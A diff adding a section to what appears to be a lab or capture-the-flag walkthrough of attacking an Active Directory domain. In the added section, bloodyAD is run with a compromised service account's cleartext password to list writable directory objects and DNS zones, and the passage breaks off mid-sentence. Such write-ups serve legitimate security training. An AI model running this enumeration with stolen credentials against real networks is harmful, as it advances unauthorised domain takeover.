@@ -716,3 +716,28 @@ SMB         dc01.trask.hsm  445    dc01             [+] trask.hsm\svc_dcsecure_a
 
 This user is now compromised!
 
+# Enumeration as `svc_dcsecure_agent`
+
+```python
+bloodyAD --host dc01.trask.hsm -d trask.hsm -u 'svc_dcsecure_agent' -p 'DCiZS3CureD1982#' -k get writable
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=trask,DC=hsm
+permission: WRITE
+
+distinguishedName: OU=Legacy Service Compatible Access,DC=trask,DC=hsm
+permission: CREATE_CHILD
+
+distinguishedName: CN=svc_dcsecure_agent,OU=ServiceAccounts,DC=trask,DC=hsm
+permission: WRITE
+
+distinguishedName: CN=svc_dcsecure_core\0ADEL:a2b4e839-17b0-4798-a92d-59a65a347754,CN=Deleted Objects,DC=trask,DC=hsm
+permission: WRITE
+
+distinguishedName: DC=trask.hsm,CN=MicrosoftDNS,DC=DomainDnsZones,DC=trask,DC=hsm
+permission: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.trask.hsm,CN=MicrosoftDNS,DC=ForestDnsZones,DC=trask,DC=hsm
+permission: CREATE_CHILD
+```
+
+I 
